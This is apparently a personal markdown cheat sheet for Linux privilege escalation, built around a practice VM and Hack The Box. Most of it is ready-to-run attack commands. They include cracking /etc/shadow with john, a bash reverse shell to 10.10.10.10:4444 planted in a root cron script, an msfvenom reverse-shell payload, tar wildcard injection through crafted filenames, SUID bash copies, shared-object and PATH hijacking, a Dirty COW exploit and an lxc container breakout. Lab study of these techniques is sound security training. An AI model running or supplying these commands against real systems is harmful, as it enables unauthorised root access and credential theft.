# Linux Privilege Escalation

## 1. Using /etc/shadow
- copy the contents of /etc/shadow into a file 'hash.txt'
- Run the command 
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- john --show hash.txt 

## 2. Using Shell Escape Sequences 
- sudo -l 
	- to find out the list of programs current user can run
- [GTFOBins](https://gtfobins.github.io) lists the ways you can gain root shell with some programs

## 3. Using environment variables 

## 4. Cron jobs 
Programs or scripts that can be scheduled to run at specific times or intervals. 
System-wide crontab is located at /etc/crontab
### 1. File permissions
- By default there should be two cron jobs scheduled to run every minute, overwrite.sh and `/usr/local/bin/compress.sh`
- `locate overwrite.sh`
- `ls -l /usr/local/bin/overwrite.sh`
- replcae the contents of overwrite.sh with 
  ```
  #!/bin/bash 
  bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
  ```
- listen to port 4444 with netcat, a root shell will spawn soon.
### 2. PATH Environment Variables 
- create another overwrite.sh in user's home directory with 
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
- make `overwrite.sh` executable
`chmod +x ~/overwrite.sh`
- run `/tmp/rootbash -p` to gain root access 
	- "-p" is used to preserver SUID/SGID i.e. temporary permission given to the user to execute a certain program or script

### 3. Wildcards 
- `cat /usr/local/bin/compress.sh`
- The `tar` command is being run with a wildcard (*) in user's home directory
- msfvenom can be used to generate a reverse shell ELF binary. 
  `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
 - transfer the shell.elf file to user's home directory and make it executable 
 `chmod +x ~/shell.elf`
```
 touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
```
- When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
- listen to port 4444 using netcat, a root shell shall spawn soon

### 4. SUID/SGID executables 
```
find / -user root -perm /40002
```
#### 1. Known exploits 
- to find all the executables on Debian VM 
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- `/usr/bin/exim-4.84-3` appears in the results. Try finding exploits for this program. 
- run the exploit to gain root shell 
`/home/user/tools/suid/exim/cve-2016-1531.sh`
#### 2. Shared Object Injection 
- In this case `/usr/share/bin/suid-so` is vulnerable to shared object injection
- searching for some "no file found" error or "open/access" message 
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
- There's no .config file from where the executable can load libcalc.co, so we create a .config file and compile libcalc.co into that folder
```
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Now running the `/usr/share/bin/suid-so` will give us **root** access 
#### 3. Using environment variables 
- The `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's **PATH** environment variable and attempting to execute programs without specifying an absolute path.
- **This isn't using the absolute path to start webserver instead using a PATH variable** 
- For e.g. it's using `service apache2` instead of `/usr/local/service apache2`
- This file seems to be trying to start a webserver using **Apache2**
- Tryin to print the printable characters in the file `suid-env`
- compiling the service 
`gcc -o service /home/user/tools/suid/service.c`
- Add the recently created service executable to the **PATH** and execute the `suid-env` again. ROOT ACCESS!
#### 4. Abusing shell features 
- It is using the absolute path, unlike the executable mentioned above.
- **In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.**
- Creating a bash function `/usr/sbin/server` which indeed is the absolute path `suid-env2` is using. 
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

- **For bash < 4.4**
	- In debugging mode, bash shell prints out additional information 
	 `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
	- Running `/tmp/rootbash -p` that was just created to gain root accses.
 
#### 5. From history files 
- User may have accidentally typed passwords inside command line instead of a prompt, which then gets stored in history files
#### 6. Config files often contain passwords in plaintext or other reversible formats.
#### 7. SSH and password keys 
#### 8. Kernel exploits - to be used only as a last resort 
- To identify the kernel exploits possible 
`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
- Using the exploirt **DIrty COW**
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```
- After the exploit finishes running `/usr/bin/passwd` will give us root shell access
### 9. Privilege escalation scripts

### 10. If user belongs to (lxc) group (HACKTHEBOX - INCLUDED)
- Install lxc-alpine-builder on attacking machine
```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
- start a server and transfer the generated .tar.gz to the victim machine  
- import the image (.tar.gz file) and mount the host file to /mnt/root on the container
```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias rootimage
lxc init rootimage <container-name> -c security.privileged=true
```
- Allow access to the entire file system as root user
```
lxc config device add <container-name> mydevice disk source=/ path=/mnt/root recursive=true
```
- Pop the root shell
```
lxc start <container-name>
lxc exec <container-name> /bin/sh
```

### 11. Checking for shadow files inside /var/backups
